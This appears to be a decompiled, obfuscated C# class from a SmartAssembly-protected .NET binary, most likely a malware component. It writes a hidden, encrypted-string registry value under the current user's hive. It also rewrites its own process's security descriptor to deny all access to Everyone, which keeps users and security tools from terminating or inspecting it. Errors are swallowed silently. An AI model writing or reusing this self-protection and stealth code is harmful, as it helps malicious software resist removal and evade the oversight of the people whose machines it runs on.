using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

internal sealed class JYKnpONXnNTAKuf
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ntcCSpqCVJaTNjO, int jjjAgzeLKNfO, [Out] byte[] ewTdQplXLsNO, uint mATpWkCrYibM, out uint cbWFTqaHQkEL);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr ckVIzZYQmyVFfJNT, int uzDktObKlismXhr, [In] byte[] CpseShqNzkQFnQ);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void LqUvfhkEkjw(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(fQUgTOUpJumL.khBNqVxVYaM(fQUgTOUpJumL.OwlNQHGyCZF(getString_0(107411506))));
			registryKey.SetValue(fQUgTOUpJumL.khBNqVxVYaM(getString_0(107410857)), getString_0(107381294));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor WTvzHkkibuGSC(IntPtr intptr_0)
	{
		byte[] ewTdQplXLsNO = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ewTdQplXLsNO, 0u, out var cbWFTqaHQkEL);
		if ((long)cbWFTqaHQkEL > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ewTdQplXLsNO = new byte[cbWFTqaHQkEL], cbWFTqaHQkEL, out cbWFTqaHQkEL))
		{
			return null;
		}
		return new RawSecurityDescriptor(ewTdQplXLsNO, 0);
	}

	private void gsRuRIpezWIC(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void EVAfyPclgzaSGUc()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = WTvzHkkibuGSC(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			gsRuRIpezWIC(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static JYKnpONXnNTAKuf()
	{
		Strings.CreateGetStringDelegate(typeof(JYKnpONXnNTAKuf));
	}
}
